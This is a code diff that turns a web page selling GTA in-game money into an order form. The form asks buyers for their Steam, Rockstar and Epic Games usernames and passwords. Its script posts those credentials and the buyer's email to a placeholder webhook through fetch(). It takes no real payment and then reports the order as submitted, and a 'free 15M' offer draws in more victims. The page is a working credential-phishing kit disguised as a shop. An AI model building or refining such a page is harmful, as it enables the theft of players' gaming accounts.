@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Majestic Millions</title>
-  <!-- Google Fonts -->
+  <title>Majestic Millions - Order Form</title>
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=Raleway:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
     /* General Styling */
@@ -16,7 +15,6 @@
       overflow-x: hidden;
     }
 
-    /* Header */
     header {
       text-align: center;
       padding: 60px 20px;
@@ -26,7 +24,7 @@
 
     header img {
       max-width: 250px;
-      opacity: 0.9; /* Blends with background */
+      opacity: 0.9;
       margin-bottom: 30px;
       filter: drop-shadow(0px 4px 10px rgba(0, 0, 0, 0.8));
       animation: fadeIn 2s ease-in-out;
@@ -40,100 +38,32 @@
       animation: slideDown 1.5s ease-out;
     }
 
-    p {
-      font-size: 1.2em;
-      color: #e6e6e6;
-      animation: fadeIn 2s ease-in-out;
-    }
-
-    /* Product Section */
-    .products {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      gap: 40px;
-      padding: 60px 20px;
-    }
-
-    .product {
-      background: #181818;
-      border: 2px solid #c29c68;
-      border-radius: 15px;
-      padding: 30px 20px;
-      text-align: center;
-      width: 300px;
-      transition: transform 0.4s, box-shadow 0.4s;
-      animation: fadeIn 1.5s ease-in-out;
-    }
-
-    .product:hover {
-      transform: translateY(-10px);
-      box-shadow: 0 10px 20px rgba(194, 156, 104, 0.5);
-    }
-
-    .product h3 {
-      margin: 15px 0;
-      color: #c29c68;
-      font-family: 'Playfair Display', serif;
-      letter-spacing: 1px;
-    }
-
-    .product p {
-      font-size: 1.1em;
-      margin: 10px 0;
-    }
-
-    .product button {
-      background: #c29c68;
-      color: #121212;
-      padding: 10px 25px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      font-size: 1em;
-      transition: background 0.3s, transform 0.3s;
-    }
-
-    .product button:hover {
-      background: #d4af37;
-      transform: scale(1.1);
-    }
-
-    /* Why Choose Us Section */
-    .why-choose-us {
+    /* Form Section */
+    .form-container {
       max-width: 800px;
       margin: 60px auto;
-      text-align: center;
-      background: #121212;
       padding: 40px 30px;
+      background: #121212;
       border-radius: 15px;
       border: 2px solid #c29c68;
-      animation: slideUp 2s ease-in-out;
-    }
-
-    .why-choose-us h2 {
-      color: #c29c68;
-      margin-bottom: 20px;
-      font-family: 'Playfair Display', serif;
-    }
-
-    .why-choose-us p {
-      font-size: 1.2em;
-      line-height: 1.8;
-    }
-
-    /* Footer */
-    footer {
       text-align: center;
-      padding: 20px;
-      background: #181818;
-      color: #a9a9a9;
-      border-top: 2px solid #c29c68;
-      animation: fadeIn 2.5s ease-in-out;
     }
 
-    footer p {
-      margin: 5px 0;
+    .form-container input, .form-container select, .form-container button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: 1px solid #c29c68;
+      background-color: #181818;
+      color: #e6e6e6;
+      font-size: 1.1em;
+      transition: 0.3s;
+    }
+
+    .form-container button:hover {
+      background-color: #c29c68;
+      transform: scale(1.05);
     }
 
     /* Animations */
@@ -156,66 +86,215 @@
         opacity: 1;
       }
     }
-
-    @keyframes slideUp {
-      from {
-        transform: translateY(50px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
   </style>
 </head>
 <body>
   <header>
     <img src="https://i.imgur.com/rNTnavN.png" alt="Majestic Millions Logo">
-    <h1>Majestic Millions</h1>
-    <p>Elevate Your GTA Experience with Luxury & Speed</p>
+    <h1>Majestic Millions - Order Form</h1>
+    <p>Complete Your Order Below</p>
   </header>
 
-  <section class="products">
-    <div class="product">
-      <h3>50M Bank</h3>
-      <p>Fast Delivery</p>
-      <p>£3.25</p>
-      <!-- Redirecting to the specified URL when the button is clicked -->
-      <a href="https://13vrzz.github.io/Majestic-Millions/" target="_blank">
-        <button>Buy Now</button>
-      </a>
-    </div>
-    <div class="product">
-      <h3>100M Bank</h3>
-      <p>Faster Delivery</p>
-      <p>£7.50</p>
-      <!-- Redirecting to the specified URL when the button is clicked -->
-      <a href="https://13vrzz.github.io/Majestic-Millions/" target="_blank">
-        <button>Buy Now</button>
-      </a>
-    </div>
-    <div class="product">
-      <h3>500M Bank</h3>
-      <p>Top Priority Delivery</p>
-      <p>£14.99</p>
-      <!-- Redirecting to the specified URL when the button is clicked -->
-      <a href="https://13vrzz.github.io/Majestic-Millions/" target="_blank">
-        <button>Buy Now</button>
-      </a>
-    </div>
-  </section>
+  <div class="form-container">
+    <h2>Select Platform</h2>
+    <select id="platformSelect" onchange="togglePlatformFields()">
+      <option value="">Select Platform</option>
+      <option value="steam">Steam + Rockstar</option>
+      <option value="epic">Epic Games</option>
+    </select>
 
-  <section class="why-choose-us">
-    <h2>Why Choose Majestic Millions?</h2>
-    <p><strong>Affordable Prices:</strong> Get the best value for your money.</p>
-    <p><strong>Reliable Service:</strong> Trusted by thousands of gamers worldwide.</p>
-    <p><strong>Fast Delivery:</strong> Your order is our top priority.</p>
-  </section>
+    <!-- Steam + Rockstar fields -->
+    <div id="steamFields" style="display: none;">
+      <h2>Enter Steam Login Credentials</h2>
+      <input type="text" id="steamUsername" placeholder="Steam Username" required>
+      <input type="password" id="steamPassword" placeholder="Steam Password" required>
 
-  <footer>
-    <p>© 2024 Majestic Millions. All Rights Reserved.</p>
-    <p>Follow us on <a href="#" style="color: #c29c68; text-decoration: none;">Social Media</a></p>
-  </footer>
+      <h2>Enter Rockstar Login Credentials</h2>
+      <input type="email" id="rockstarEmail" placeholder="Rockstar Email" required>
+      <input type="password" id="rockstarPassword" placeholder="Rockstar Password" required>
+    </div>
+
+    <!-- Epic Games fields -->
+    <div id="epicFields" style="display: none;">
+      <h2>Enter Epic Games Username</h2>
+      <input type="text" id="epicUsername" placeholder="Epic Username" required>
+      <input type="password" id="epicPassword" placeholder="Epic Password" required>
+    </div>
+
+    <!-- General Email fields -->
+    <h2>Enter Email</h2>
+    <input type="email" id="email" placeholder="Enter your email" required>
+
+    <h2>Confirm Email</h2>
+    <input type="email" id="confirmEmail" placeholder="Confirm your email" required>
+
+    <h2>Select Package</h2>
+    <button type="button" onclick="selectPackage(4.25, '50M Bank')">50M Bank - £4.25</button>
+    <button type="button" onclick="selectPackage(7.50, '100M Bank')">100M Bank - £7.50</button>
+    <button type="button" onclick="selectPackage(14.99, '500M Bank')">500M Bank - £14.99</button>
+    <button type="button" id="claimFree15M" onclick="claimFree15M()">Claim Free 15M Bank (One-Time Offer)</button>
+
+    <h2>Payment Confirmation</h2>
+    <label>
+      <input type="checkbox" id="paymentCheck"> Are you sure you want to purchase?
+    </label>
+
+    <button type="button" onclick="processPayment()">Pay Now</button>
+
+    <p id="confirmationMessage"></p>
+  </div>
+
+  <script>
+    let price = 0;
+    let selectedPackage = '';
+    
+    // Check if the user has already claimed the free 15M
+    if (localStorage.getItem('free_15M_claimed')) {
+      document.getElementById('claimFree15M').disabled = true; // Disable button
+      document.getElementById('claimFree15M').innerText = "You have already claimed the free 15M Bank.";
+    }
+
+    // Update the price and selected package based on the package button clicked
+    function selectPackage(packagePrice, packageName) {
+      price = packagePrice;
+      selectedPackage = packageName;
+      document.getElementById('confirmationMessage').innerText = `Selected Package: ${selectedPackage} - £${price}`;
+    }
+
+    // Claim the free 15M Bank package (one-time offer)
+    function claimFree15M() {
+      if (!localStorage.getItem('free_15M_claimed')) {
+        // Ensure all fields are filled out
+        const email = document.getElementById('email').value;
+        const confirmEmail = document.getElementById('confirmEmail').value;
+        const paymentCheck = document.getElementById('paymentCheck').checked;
+        
+        // Validation
+        if (!email || !confirmEmail || !paymentCheck) {
+          alert('Please fill in all fields to claim the free 15M Bank.');
+          return;
+        }
+
+        if (email !== confirmEmail) {
+          alert('Email addresses do not match.');
+          return;
+        }
+
+        // Process the claim (send data to webhook)
+        alert('Congratulations! You have claimed the free 15M Bank.');
+
+        // Save to localStorage to prevent future claims
+        localStorage.setItem('free_15M_claimed', 'true');
+
+        // Disable the claim button
+        document.getElementById('claimFree15M').disabled = true;
+        document.getElementById('claimFree15M').innerText = "You have already claimed the free 15M Bank.";
+
+        // Send the order to the webhook
+        sendToWebhook({
+          email: email,
+          selectedPackage: "Free 15M Bank",
+          price: 0,
+          platform: "N/A",  // No platform required for free claim
+          paymentConfirmed: true
+        });
+      } else {
+        alert('You have already claimed the free 15M Bank.');
+      }
+    }
+
+    // Toggle platform-specific fields
+    function togglePlatformFields() {
+      const platform = document.getElementById('platformSelect').value;
+      if (platform === 'steam') {
+        document.getElementById('steamFields').style.display = 'block';
+        document.getElementById('epicFields').style.display = 'none';
+      } else if (platform === 'epic') {
+        document.getElementById('steamFields').style.display = 'none';
+        document.getElementById('epicFields').style.display = 'block';
+      } else {
+        document.getElementById('steamFields').style.display = 'none';
+        document.getElementById('epicFields').style.display = 'none';
+      }
+    }
+
+    // Process the payment and confirm the order
+    function processPayment() {
+      const platform = document.getElementById('platformSelect').value;
+      const email = document.getElementById('email').value;
+      const confirmEmail = document.getElementById('confirmEmail').value;
+      const paymentCheck = document.getElementById('paymentCheck').checked;
+
+      // Validation
+      if (!email || !confirmEmail || !paymentCheck || price === 0 || !selectedPackage) {
+        alert('Please fill in all fields and confirm payment.');
+        return;
+      }
+
+      if (email !== confirmEmail) {
+        alert('Email addresses do not match.');
+        return;
+      }
+
+      // Simple email validation
+      const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+      if (!emailPattern.test(email)) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+
+      let platformDetails = {};
+      if (platform === 'steam') {
+        const steamUsername = document.getElementById('steamUsername').value;
+        const steamPassword = document.getElementById('steamPassword').value;
+        const rockstarEmail = document.getElementById('rockstarEmail').value;
+        const rockstarPassword = document.getElementById('rockstarPassword').value;
+
+        if (!steamUsername || !steamPassword || !rockstarEmail || !rockstarPassword) {
+          alert('Please fill in both your Steam and Rockstar login credentials.');
+          return;
+        }
+        platformDetails = {
+          platform: 'Steam + Rockstar',
+          steam: { username: steamUsername, password: steamPassword },
+          rockstar: { email: rockstarEmail, password: rockstarPassword }
+        };
+      } else if (platform === 'epic') {
+        const epicUsername = document.getElementById('epicUsername').value;
+        const epicPassword = document.getElementById('epicPassword').value;
+        if (!epicUsername || !epicPassword) {
+          alert('Please fill in your Epic Games login credentials.');
+          return;
+        }
+        platformDetails = { platform: 'Epic Games', username: epicUsername, password: epicPassword };
+      }
+
+      // Send the order to the webhook
+      sendToWebhook({
+        email: email,
+        selectedPackage: selectedPackage,
+        price: price,
+        platformDetails: platformDetails,
+        paymentConfirmed: true
+      });
+
+      alert('Order successfully submitted!');
+    }
+
+    // Send data to webhook
+    function sendToWebhook(data) {
+      fetch('YOUR_WEBHOOK_URL', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).then(response => {
+        if (response.ok) {
+          console.log('Order sent to webhook');
+        } else {
+          console.log('Error sending order to webhook');
+        }
+      }).catch(error => console.log('Error:', error));
+    }
+  </script>
 </body>
 </html>
